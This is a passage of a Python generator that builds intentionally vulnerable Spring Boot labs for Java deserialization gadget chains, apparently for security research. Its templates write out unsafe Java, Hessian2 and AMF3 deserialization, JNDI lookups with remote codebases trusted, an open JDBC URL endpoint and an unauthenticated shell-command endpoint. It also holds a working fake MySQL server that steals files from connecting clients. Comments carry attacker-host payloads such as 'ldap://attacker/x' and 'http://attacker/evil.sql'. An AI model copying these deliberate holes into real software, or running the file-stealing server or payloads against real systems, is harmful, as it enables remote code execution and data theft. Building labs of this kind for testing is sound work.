        </dependency>"""


# ---------------------------------------------------------------------------
# Shared Java boilerplate helpers (keeps controller functions DRY)
# ---------------------------------------------------------------------------

def _java_dto_block() -> str:
    """Inner DTOs injected into every controller."""
    return """\

    // ---- DTOs -------------------------------------------------------

    public static class DeserRequest {
        private String payload;
        public String getPayload() { return payload; }
        public void setPayload(String v) { payload = v; }
    }

    public static class DeserResult {
        public String id, chainName, status, message, objectClass, output, stackTrace;
        public long timestamp = System.currentTimeMillis();
    }

    private static String stackTrace(Throwable t) {
        java.io.StringWriter sw = new java.io.StringWriter();
        t.printStackTrace(new java.io.PrintWriter(sw));
        return sw.toString();
    }
"""


def _java_common_endpoints(chain_name: str) -> str:
    """GET /result, GET /results, DELETE /results, GET /health."""
    return f"""\
    @GetMapping("/result/{{id}}")
    public DeserResult getResult(@PathVariable String id) {{
        return results.get(id);
    }}

    @GetMapping("/results")
    public java.util.Collection<DeserResult> getAllResults() {{
        return results.values();
    }}

    @DeleteMapping("/results")
    public java.util.Map<String,String> clearResults() {{
        int n = results.size();
        results.clear();
        java.util.Map<String,String> m = new java.util.HashMap<>();
        m.put("cleared", String.valueOf(n));
        return m;
    }}

    @GetMapping("/health")
    public java.util.Map<String,String> health() {{
        java.util.Map<String,String> m = new java.util.HashMap<>();
        m.put("status", "UP");
        m.put("chain", "{chain_name}");
        return m;
    }}
"""


# ---------------------------------------------------------------------------
# Controller templates — one function per protocol
# ---------------------------------------------------------------------------

def _ctrl_native(pkg: str, chain_name: str) -> str:
    return f"""\
package {pkg};

import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Native Java deserialization endpoint for: {chain_name}
 *
 * POST /api/deserialize  body: {{"payload":"<base64-java-serialized>"}}
 * GET  /api/exec?cmd=id  direct command execution (RCE verification helper)
 * GET  /api/health
 *
 * WARNING: intentionally vulnerable — for security research only.
 */
@RestController
@RequestMapping("/api")
public class DeserializationController {{

    private final Map<String, DeserResult> results = new ConcurrentHashMap<>();

    @PostMapping("/deserialize")
    public Map<String, Object> deserialize(@RequestBody DeserRequest req) {{
        String id = UUID.randomUUID().toString();
        DeserResult res = new DeserResult();
        res.id = id;
        res.chainName = "{chain_name}";

        try {{
            byte[] bytes = Base64.getDecoder().decode(req.getPayload().trim());

            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
            Object obj = ois.readObject();
            ois.close();

            res.status      = "SUCCESS";
            res.objectClass = obj.getClass().getName();
            res.message     = "readObject() completed — exploit executed if deps are correct";

            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",      "SUCCESS");
            m.put("id",          id);
            m.put("objectClass", res.objectClass);
            m.put("message",     res.message);
            return m;

        }} catch (Exception e) {{
            res.status     = "ERROR";
            res.message    = e.getMessage();
            res.stackTrace = stackTrace(e);
            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",     "ERROR");
            m.put("id",         id);
            m.put("error",      e.getMessage());
            m.put("stackTrace", res.stackTrace);
            return m;
        }}
    }}

    @GetMapping("/exec")
    public Map<String, Object> exec(@RequestParam String cmd) {{
        Map<String, Object> m = new LinkedHashMap<>();
        try {{
            String[] shell = new String[]{{"/bin/sh", "-c", cmd}};
            Process p = Runtime.getRuntime().exec(shell);
            byte[] out = readStream(p.getInputStream());
            byte[] err = readStream(p.getErrorStream());
            p.waitFor();
            m.put("status",  "SUCCESS");
            m.put("stdout",  new String(out, "UTF-8").trim());
            m.put("stderr",  new String(err, "UTF-8").trim());
            m.put("exit",    p.exitValue());
        }} catch (Exception e) {{
            m.put("status", "ERROR");
            m.put("error",  e.getMessage());
        }}
        return m;
    }}

    private static byte[] readStream(InputStream is) throws IOException {{
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte[] tmp = new byte[4096];
        int n;
        while ((n = is.read(tmp)) != -1) buf.write(tmp, 0, n);
        return buf.toByteArray();
    }}

{_java_common_endpoints(chain_name)}
{_java_dto_block()}
}}
"""


def _ctrl_hessian(pkg: str, chain_name: str) -> str:
    return f"""\
package {pkg};

import com.caucho.hessian.io.Hessian2Input;
import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Hessian2 deserialization endpoint for: {chain_name}
 *
 * POST /api/deserialize  body: {{"payload":"<base64-hessian2>"}}
 * GET  /api/exec?cmd=id  direct command execution (RCE verification helper)
 *
 * WARNING: intentionally vulnerable — for security research only.
 */
@RestController
@RequestMapping("/api")
public class DeserializationController {{

    private final Map<String, DeserResult> results = new ConcurrentHashMap<>();

    @PostMapping("/deserialize")
    public Map<String, Object> deserialize(@RequestBody DeserRequest req) {{
        String id = UUID.randomUUID().toString();
        DeserResult res = new DeserResult();
        res.id = id;
        res.chainName = "{chain_name}";

        try {{
            byte[] bytes = Base64.getDecoder().decode(req.getPayload().trim());

            Hessian2Input hi = new Hessian2Input(new ByteArrayInputStream(bytes));
            Object obj = hi.readObject();
            hi.close();

            res.status      = "SUCCESS";
            res.objectClass = obj == null ? "null" : obj.getClass().getName();
            res.message     = "Hessian2 readObject() completed";

            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",      "SUCCESS");
            m.put("id",          id);
            m.put("objectClass", res.objectClass);
            m.put("message",     res.message);
            return m;

        }} catch (Exception e) {{
            res.status     = "ERROR";
            res.message    = e.getMessage();
            res.stackTrace = stackTrace(e);
            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",     "ERROR");
            m.put("id",         id);
            m.put("error",      e.getMessage());
            m.put("stackTrace", res.stackTrace);
            return m;
        }}
    }}

    @GetMapping("/exec")
    public Map<String, Object> exec(@RequestParam String cmd) {{
        Map<String, Object> m = new LinkedHashMap<>();
        try {{
            String[] shell = new String[]{{"/bin/sh", "-c", cmd}};
            Process p = Runtime.getRuntime().exec(shell);
            byte[] out = readStream(p.getInputStream());
            byte[] err = readStream(p.getErrorStream());
            p.waitFor();
            m.put("status",  "SUCCESS");
            m.put("stdout",  new String(out, "UTF-8").trim());
            m.put("stderr",  new String(err, "UTF-8").trim());
            m.put("exit",    p.exitValue());
        }} catch (Exception e) {{
            m.put("status", "ERROR");
            m.put("error",  e.getMessage());
        }}
        return m;
    }}

    private static byte[] readStream(InputStream is) throws IOException {{
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte[] tmp = new byte[4096];
        int n;
        while ((n = is.read(tmp)) != -1) buf.write(tmp, 0, n);
        return buf.toByteArray();
    }}

{_java_common_endpoints(chain_name)}
{_java_dto_block()}
}}
"""


def _ctrl_amf(pkg: str, chain_name: str) -> str:
    return f"""package {pkg};

import flex.messaging.io.amf.AmfMessageDeserializer;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.amf.ActionContext;
import flex.messaging.io.SerializationContext;
import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * AMF3 (BlazeDS) deserialization endpoint for: {chain_name}
 *
 * POST /api/deserialize  body: {{"payload":"<base64-amf3-bytes>"}}
 * GET  /api/exec?cmd=id  direct command execution (RCE verification helper)
 *
 * WARNING: intentionally vulnerable — for security research only.
 */
@RestController
@RequestMapping("/api")
public class DeserializationController {{

    private final Map<String, DeserResult> results = new ConcurrentHashMap<>();

    @PostMapping("/deserialize")
    public Map<String, Object> deserialize(@RequestBody DeserRequest req) {{
        String id = UUID.randomUUID().toString();
        DeserResult res = new DeserResult();
        res.id = id;
        res.chainName = "{chain_name}";

        try {{
            byte[] bytes = Base64.getDecoder().decode(req.getPayload().trim());

            SerializationContext sc = new SerializationContext();
            AmfMessageDeserializer deser = new AmfMessageDeserializer();
            deser.initialize(sc, new ByteArrayInputStream(bytes), null);
            ActionMessage msg = new ActionMessage();
            deser.readMessage(msg, new ActionContext());

            res.status      = "SUCCESS";
            res.objectClass = msg.getClass().getName();
            res.message     = "AMF3 readMessage() completed — gadget triggered if deps match";

            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",      "SUCCESS");
            m.put("id",          id);
            m.put("objectClass", res.objectClass);
            m.put("message",     res.message);
            return m;

        }} catch (Exception e) {{
            res.status     = "ERROR";
            res.message    = e.getMessage();
            res.stackTrace = stackTrace(e);
            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",     "ERROR");
            m.put("id",         id);
            m.put("error",      e.getMessage());
            m.put("stackTrace", res.stackTrace);
            return m;
        }}
    }}

{_java_common_endpoints(chain_name)}
{_java_dto_block()}
}}
"""


def _ctrl_jndi_ref(pkg: str, chain_name: str) -> str:
    return f"""\
package {pkg};

import org.springframework.web.bind.annotation.*;
import javax.naming.InitialContext;
import java.io.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * JNDI Reference deserialization endpoint for: {chain_name}
 *
 * POST /api/deserialize  body: {{"payload":"ldap://host/path"}} (plain or Base64)
 *
 * WARNING: intentionally vulnerable — for security research only.
 */
@RestController
@RequestMapping("/api")
public class DeserializationController {{

    private final Map<String, DeserResult> results = new ConcurrentHashMap<>();

    @PostMapping("/deserialize")
    public Map<String, Object> deserialize(@RequestBody DeserRequest req) {{
        String id = UUID.randomUUID().toString();
        DeserResult res = new DeserResult();
        res.id = id;
        res.chainName = "{chain_name}";

        try {{
            String raw = req.getPayload().trim();
            String jndiUrl;
            try {{
                jndiUrl = new String(Base64.getDecoder().decode(raw), "UTF-8").trim();
            }} catch (Exception ignored) {{
                jndiUrl = raw;
            }}

            System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase",   "true");
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase",    "true");
            System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true");
            System.setProperty("com.sun.jndi.ldap.object.trustSerialData",    "true");
            System.setProperty("com.sun.jndi.rmi.object.trustSerialData",     "true");

            InitialContext ctx = new InitialContext();
            Object obj = ctx.lookup(jndiUrl);

            res.status      = "SUCCESS";
            res.objectClass = obj == null ? "null" : obj.getClass().getName();
            res.message     = "JNDI lookup completed: " + jndiUrl;

            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",      "SUCCESS");
            m.put("id",          id);
            m.put("jndiUrl",     jndiUrl);
            m.put("objectClass", res.objectClass);
            return m;

        }} catch (Exception e) {{
            res.status     = "ERROR";
            res.message    = e.getMessage();
            res.stackTrace = stackTrace(e);
            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",     "ERROR");
            m.put("id",         id);
            m.put("error",      e.getMessage());
            m.put("stackTrace", res.stackTrace);
            return m;
        }}
    }}

{_java_common_endpoints(chain_name)}
{_java_dto_block()}
}}
"""


def _ctrl_jndi_basic(pkg: str, chain_name: str) -> str:
    return f"""\
package {pkg};

import org.springframework.web.bind.annotation.*;
import javax.naming.InitialContext;
import java.io.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * JNDI Basic lookup endpoint for: {chain_name}
 *
 * POST /api/deserialize  body: {{"payload":"ldap://attacker/x"}} (plain or Base64)
 *
 * WARNING: intentionally vulnerable — for security research only.
 */
@RestController
@RequestMapping("/api")
public class DeserializationController {{

    private final Map<String, DeserResult> results = new ConcurrentHashMap<>();

    @PostMapping("/deserialize")
    public Map<String, Object> deserialize(@RequestBody DeserRequest req) {{
        String id = UUID.randomUUID().toString();
        DeserResult res = new DeserResult();
        res.id = id;
        res.chainName = "{chain_name}";

        try {{
            String raw = req.getPayload().trim();
            String jndiUrl;
            try {{
                jndiUrl = new String(Base64.getDecoder().decode(raw), "UTF-8").trim();
            }} catch (Exception ignored) {{
                jndiUrl = raw;
            }}

            System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase",   "true");
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase",    "true");
            System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true");
            System.setProperty("com.sun.jndi.ldap.object.trustSerialData",    "true");
            System.setProperty("com.sun.jndi.rmi.object.trustSerialData",     "true");

            new InitialContext().lookup(jndiUrl);

            res.status  = "SUCCESS";
            res.message = "JNDI lookup triggered: " + jndiUrl;
            results.put(id, res);

            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",  "SUCCESS");
            m.put("id",      id);
            m.put("jndiUrl", jndiUrl);
            return m;

        }} catch (Exception e) {{
            res.status     = "ERROR";
            res.message    = e.getMessage();
            res.stackTrace = stackTrace(e);
            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",     "ERROR");
            m.put("id",         id);
            m.put("error",      e.getMessage());
            return m;
        }}
    }}

{_java_common_endpoints(chain_name)}
{_java_dto_block()}
}}
"""


def _ctrl_jdbc(pkg: str, chain_name: str) -> str:
    return f"""\
package {pkg};

import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * JDBC URL注入端点 for: {chain_name}
 *
 * POST /api/deserialize  body: {{"payload":"jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker/evil.sql'"}}
 * GET  /api/exec?cmd=id  direct command execution (RCE verification helper)
 *
 * WARNING: intentionally vulnerable — for security research only.
 */
@RestController
@RequestMapping("/api")
public class DeserializationController {{

    private final Map<String, DeserResult> results = new ConcurrentHashMap<>();

    @PostMapping("/deserialize")
    public Map<String, Object> deserialize(@RequestBody DeserRequest req) {{
        String id = UUID.randomUUID().toString();
        DeserResult res = new DeserResult();
        res.id = id;
        res.chainName = "{chain_name}";

        try {{
            String url = req.getPayload().trim();
            Connection connection = DriverManager.getConnection(url);
            connection.close();

            res.status      = "SUCCESS";
            res.objectClass = connection.getClass().getName();
            res.message     = "DriverManager.getConnection() completed — exploit executed if deps are correct";

            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",      "SUCCESS");
            m.put("id",          id);
            m.put("objectClass", res.objectClass);
            m.put("message",     res.message);
            return m;

        }} catch (Exception e) {{
            res.status     = "ERROR";
            res.message    = e.getMessage();
            res.stackTrace = stackTrace(e);
            results.put(id, res);
            Map<String,Object> m = new LinkedHashMap<>();
            m.put("status",     "ERROR");
            m.put("id",         id);
            m.put("error",      e.getMessage());
            m.put("stackTrace", res.stackTrace);
            return m;
        }}
    }}

    @GetMapping("/exec")
    public Map<String, Object> exec(@RequestParam String cmd) {{
        Map<String, Object> m = new LinkedHashMap<>();
        try {{
            String[] shell = new String[]{{"/bin/sh", "-c", cmd}};
            Process p = Runtime.getRuntime().exec(shell);
            byte[] out = readStream(p.getInputStream());
            byte[] err = readStream(p.getErrorStream());
            p.waitFor();
            m.put("status",  "SUCCESS");
            m.put("stdout",  new String(out, "UTF-8").trim());
            m.put("stderr",  new String(err, "UTF-8").trim());
            m.put("exit",    p.exitValue());
        }} catch (Exception e) {{
            m.put("status", "ERROR");
            m.put("error",  e.getMessage());
        }}
        return m;
    }}

    private static byte[] readStream(InputStream is) throws IOException {{
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte[] tmp = new byte[4096];
        int n;
        while ((n = is.read(tmp)) != -1) buf.write(tmp, 0, n);
        return buf.toByteArray();
    }}

{_java_common_endpoints(chain_name)}
{_java_dto_block()}
}}
"""


def _ctrl_info(pkg: str, chain_name: str) -> str:
    """
    Info-only controller for OtherPayload chains.
    These chains are payload-generation utilities (JSP文件, Spring Bean Xml,
    SpringBoot charsets.jar生成): they produce a file that must be delivered
    to the target out-of-band. No /api/deserialize endpoint is provided.
    """
    return f"""\
package {pkg};

import org.springframework.web.bind.annotation.*;
import java.util.*;

/**
 * Info-only endpoint for: {chain_name}
 *
 * This chain is a payload-generation utility, not a deserializable target.
 * Generate the payload with java-chains and deploy the output file manually.
 *
 * GET /api/info    — chain metadata and usage instructions
 * GET /api/health  — health check
 */
@RestController
@RequestMapping("/api")
public class DeserializationController {{

    @GetMapping("/info")
    public Map<String, Object> info() {{
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("chain",       "{chain_name}");
        m.put("type",        "payload-generator");
        m.put("description", "This chain generates a file payload via java-chains. "
            + "Deploy the generated file to the target manually.");
        m.put("usage",       "Use java-chains to generate the payload, "
            + "then serve or upload it to the target application.");
        m.put("hasDeserializeEndpoint", false);
        return m;
    }}

    @GetMapping("/health")
    public Map<String, Object> health() {{
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("status", "UP");
        m.put("chain",  "{chain_name}");
        m.put("type",   "info-only");
        return m;
    }}
}}
"""


def _ctrl_fake_mysql(pkg: str, chain_name: str) -> str:
    """
    FakeMySQL read-file controller for FakeMySQLReadPayload chains (ReadFile).

    Starts a minimal fake MySQL server on port 3306 that abuses the
    LOAD DATA LOCAL INFILE protocol to read an arbitrary file from the
    connecting MySQL client.

    Flow:
      1. POST /api/deserialize  {"payload":"/etc/passwd"}
         → starts a one-shot TCP listener on :3306 (30 s timeout)
         → returns {"status":"LISTENING","id":"<uuid>","port":3306,"target":"..."}
      2. Victim MySQL client connects to port 3306
         → fake server completes the minimal handshake, then sends the
           LOCAL INFILE request (packet 0xFB + file path)
         → client sends the file content back
         → server stores it in results map
      3. GET /api/result/{id}
         → returns {"status":"SUCCESS","content":"<file text>"}
           or       {"status":"PENDING"} while still waiting
    """
    return f"""\
package {pkg};

import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicReference;

/**
 * FakeMySQL read-file endpoint for: {chain_name}
 *
 * POST /api/deserialize  body: {{"payload":"<target_file_path>"}}
 * GET  /api/result/{{id}}  poll for captured file content
 * GET  /api/health
 *
 * WARNING: intentionally vulnerable — for security research only.
 */
@RestController
@RequestMapping("/api")
public class DeserializationController {{

    private static final int FAKE_MYSQL_PORT    = 3306;
    private static final int ACCEPT_TIMEOUT_MS  = 30_000;

    private final Map<String, String> results = new ConcurrentHashMap<>();

    // ---- Main endpoint -----------------------------------------------

    @PostMapping("/deserialize")
    public Map<String, Object> deserialize(@RequestBody DeserRequest req) {{
        String filePath = req.getPayload() != null ? req.getPayload().trim() : "/etc/passwd";
        String id = UUID.randomUUID().toString();
        Map<String, Object> m = new LinkedHashMap<>();

        try {{
            ServerSocket server = new ServerSocket(FAKE_MYSQL_PORT);
            server.setSoTimeout(ACCEPT_TIMEOUT_MS);

            m.put("status",  "LISTENING");
            m.put("id",      id);
            m.put("port",    FAKE_MYSQL_PORT);
            m.put("target",  filePath);
            m.put("message", "Fake MySQL server listening on :"
                + FAKE_MYSQL_PORT + ". Connect a MySQL client to trigger LOAD DATA LOCAL INFILE.");

            // Handle the single client connection in a background thread
            final String captureId   = id;
            final String captureFile = filePath;
            new Thread(() -> {{
                try (Socket client = server.accept()) {{
                    String content = handleMysqlClient(client, captureFile);
                    results.put(captureId, content);
                }} catch (SocketTimeoutException ste) {{
                    results.put(captureId, "ERROR: accept timeout — no client connected within "
                        + ACCEPT_TIMEOUT_MS / 1000 + "s");
                }} catch (Exception e) {{
                    results.put(captureId, "ERROR: " + e.getMessage());
                }} finally {{
                    try {{ server.close(); }} catch (Exception ignored) {{}}
                }}
            }}, "fake-mysql-" + id.substring(0, 8)).start();

        }} catch (Exception e) {{
            m.put("status", "ERROR");
            m.put("error",  e.getMessage());
        }}
        return m;
    }}

    // ---- Poll for captured file content ------------------------------

    @GetMapping("/result/{{id}}")
    public Map<String, Object> getResult(@PathVariable String id) {{
        Map<String, Object> m = new LinkedHashMap<>();
        String r = results.get(id);
        if (r == null) {{
            m.put("status",  "PENDING");
            m.put("message", "Waiting for MySQL client to connect...");
        }} else if (r.startsWith("ERROR:")) {{
            m.put("status", "ERROR");
            m.put("error",  r);
        }} else {{
            m.put("status",  "SUCCESS");
            m.put("content", r);
        }}
        return m;
    }}

    @GetMapping("/health")
    public Map<String, Object> health() {{
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("status", "UP");
        m.put("chain",  "{chain_name}");
        m.put("type",   "fake-mysql");
        return m;
    }}

    // ---- Minimal MySQL protocol implementation -----------------------

    /**
     * Perform a stripped-down MySQL server handshake, then issue a
     * LOCAL INFILE request for the target file and read the content back.
     */
    private String handleMysqlClient(Socket client, String filePath) throws Exception {{
        DataOutputStream out = new DataOutputStream(client.getOutputStream());
        DataInputStream  in  = new DataInputStream(client.getInputStream());

        // 1. Send server greeting (Protocol v10 / MySQL 5.7 minimal)
        out.write(buildGreeting());
        out.flush();

        // 2. Read client authentication packet (discard — we accept anything)
        skipPacket(in);

        // 3. Send OK
        out.write(new byte[]{{0x07,0x00,0x00,0x02,
                              0x00,0x00,0x00,0x02,0x00,0x00,0x00}});
        out.flush();

        // 4. Read the first COM_QUERY (e.g. "SELECT @@version_comment") and discard
        skipPacket(in);

        // 5. Respond with LOCAL INFILE request (0xFB marker + file path)
        out.write(buildLocalInfileRequest(filePath));
        out.flush();

        // 6. Read file content chunks until empty packet (EOF signal)
        ByteArrayOutputStream fileData = new ByteArrayOutputStream();
        while (true) {{
            byte[] lenBuf = new byte[4];
            in.readFully(lenBuf);
            int pktLen = (lenBuf[0] & 0xFF)
                       | ((lenBuf[1] & 0xFF) << 8)
                       | ((lenBuf[2] & 0xFF) << 16);
            if (pktLen == 0) break;   // empty packet = client finished sending
            byte[] chunk = new byte[pktLen];
            in.readFully(chunk);
            fileData.write(chunk);
        }}

        // 7. Send final OK so the client disconnects cleanly
        out.write(new byte[]{{0x07,0x00,0x00,0x04,
                              0x00,0x00,0x00,0x02,0x00,0x00,0x00}});
        out.flush();

        return fileData.toString("UTF-8");
    }}

    private void skipPacket(DataInputStream in) throws IOException {{
        byte[] lenBuf = new byte[4];
        in.readFully(lenBuf);
        int pktLen = (lenBuf[0] & 0xFF)
                   | ((lenBuf[1] & 0xFF) << 8)
                   | ((lenBuf[2] & 0xFF) << 16);
        if (pktLen > 0) {{
            byte[] discard = new byte[pktLen];
            in.readFully(discard);
        }}
    }}

    /**
     * Build a minimal MySQL Protocol v10 server greeting.
     * Capability flags include CLIENT_LOCAL_FILES (0x0080) so the client
     * will honour the LOAD DATA LOCAL INFILE request we send later.
     */
    private byte[] buildGreeting() {{
        // Server version string "5.7.0\0" + minimal capability flags
        byte[] payload = {{
            0x0a,                                           // protocol_version = 10
            0x35,0x2e,0x37,0x2e,0x30,0x00,                 // server_version "5.7.0\0"
            0x01,0x00,0x00,0x00,                            // connection_id = 1 (LE)
            0x60,0x3f,0x21,0x40,0x58,0x35,0x5a,0x75,0x00, // auth-plugin-data-1 + filler
            // capability_flags_1 (low 2 bytes): CLIENT_LONG_PASSWORD | CLIENT_LONG_FLAG |
            //   CLIENT_LOCAL_FILES | CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION
            (byte)0xff, (byte)0xf7,
            0x21,                                           // character_set = utf8
            0x02,0x00,                                      // status_flags = SERVER_STATUS_AUTOCOMMIT
            // capability_flags_2 (high 2 bytes)
            (byte)0xff, (byte)0x81,
            0x15,                                           // auth_plugin_data_len = 21
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // reserved (10 bytes)
            // auth-plugin-data-2 (12 bytes) + NUL
            0x21,0x4a,0x44,0x2b,0x55,0x5c,0x28,0x4c,0x55,0x5e,0x75,0x5c,0x00,
            // auth-plugin-name "mysql_native_password\0"
            0x6d,0x79,0x73,0x71,0x6c,0x5f,0x6e,0x61,0x74,0x69,0x76,0x65,
            0x5f,0x70,0x61,0x73,0x73,0x77,0x6f,0x72,0x64,0x00
        }};
        return wrapPacket(payload, 0);
    }}

    /**
     * Build a LOCAL INFILE request packet.
     * Format: length(3) + seq(1) + 0xFB + file_path_bytes
     */
    private byte[] buildLocalInfileRequest(String path) throws Exception {{
        byte[] pathBytes = path.getBytes("UTF-8");
        byte[] payload   = new byte[1 + pathBytes.length];
        payload[0] = (byte) 0xFB;
        System.arraycopy(pathBytes, 0, payload, 1, pathBytes.length);
        return wrapPacket(payload, 1);
    }}

    /** Prepend the 4-byte MySQL packet header (length + sequence number). */
    private byte[] wrapPacket(byte[] payload, int seq) {{
        byte[] pkt = new byte[4 + payload.length];
        pkt[0] = (byte)  (payload.length        & 0xFF);
        pkt[1] = (byte) ((payload.length >>  8) & 0xFF);
        pkt[2] = (byte) ((payload.length >> 16) & 0xFF);
        pkt[3] = (byte)  (seq                   & 0xFF);
        System.arraycopy(payload, 0, pkt, 4, payload.length);
        return pkt;
    }}

    // ---- DTO --------------------------------------------------------

    public static class DeserRequest {{
        private String payload;
        public String getPayload()           {{ return payload; }}
        public void   setPayload(String v)   {{ payload = v; }}
    }}
}}
"""


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="Vulnerable Environment Generator v3.1")
    parser.add_argument("--pom-dir",    default="gadget-dependencies")
    parser.add_argument("--output-dir", default="generated-env")
    parser.add_argument("--chain",      help="Generate a single chain only")
    parser.add_argument("--build",      action="store_true",
                        help="Run mvn + docker build after generation")
    args = parser.parse_args()

    gen = VulnerableEnvGenerator(args.pom_dir, args.output_dir)

    if args.chain:
        r = gen.generate_single_environment(args.chain)
        if r.get("success"):
            print(f"[OK] {r['project_path']}  [{r['controller_type']}]")
            if args.build:
                br = gen.build_maven(Path(r["project_path"]))
                print("[OK] mvn build" if br["success"] else f"[ERR] {br['error']}")
        else:
            print(f"[ERR] {r.get('error')}")
            sys.exit(1)
    else:
        results = gen.generate_all_environments()
        print(f"\nGenerated {results['total_generated']} environments → {results['output_directory']}")
        gen.generate_docker_compose(results.get("environments", {}))
        if args.build:
            for name, env in results.get("environments", {}).items():
                if env.get("success"):
                    br = gen.build_maven(Path(env["project_path"]))
                    safe = _safe_name(name)
                    if br["success"]:
                        gen.build_docker(Path(env["project_path"]), f"{safe}:latest")


if __name__ == "__main__":
    main()
